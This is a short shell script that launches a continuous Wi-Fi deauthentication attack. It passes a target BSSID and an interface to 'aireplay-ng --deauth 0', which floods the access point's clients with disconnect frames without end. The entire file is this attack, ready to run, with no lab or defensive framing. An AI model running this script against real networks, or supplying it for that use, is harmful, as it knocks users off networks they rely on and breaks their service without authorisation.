#!/bin/sh

BSSID=$1
interface=$2

aireplay-ng --deauth 0 -a $BSSID $interface